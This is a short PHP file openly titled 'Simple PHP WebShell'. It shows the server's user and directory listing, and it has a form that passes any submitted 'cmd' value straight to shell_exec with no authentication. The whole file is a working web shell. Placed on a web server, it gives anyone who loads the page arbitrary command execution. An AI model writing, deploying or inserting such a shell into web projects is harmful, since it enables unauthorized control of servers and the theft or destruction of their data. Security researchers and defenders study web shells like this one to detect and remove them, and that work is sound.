<!DOCTYPE html>
<html>
<head>
	<!-- If we're adding html5 elements and the browser doesn't support it -->
	<!--[if lt IE 9]>
  	<script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
  	<![endif]-->

	<title>Simple PHP WebShell</title>

</head>
<body>

	<h2>Simple WebShell</h2>
	<br>
	<?php

		$cwd = getcwd();
		$user = shell_exec("whoami");

	?>
	<b>Who am i ? : </b><?php echo $user; ?>
	<br>
	<b>You are here : </b><?php echo $cwd; ?>
	<br>
	<br>

	<pre>
		<b>Files in currenty directory</b>
		<?php
			$lsFiles = shell_exec("ls -alt");
			echo $lsFiles ;
		?>
	</pre>

	<form name="cmd" method="post" action="http://<?php echo $_SERVER['HTTP_HOST']; echo $_SERVER['REQUEST_URI'] ?>">
		<label for="cmd"><b>Command line :</b></label>
		<input type="text" name="cmd" size="40">
	</form>

	<pre>
		<?php
			echo '<b>Result</b>';
			echo '<br>';
			if($_SERVER['REQUEST_METHOD'] == 'POST')
			{
				echo shell_exec($_POST['cmd']) ;
			}
			else
			{
				echo "Please submitt a command to get a result ..." ;
			}
		?>
	</pre>

</body>
</html>
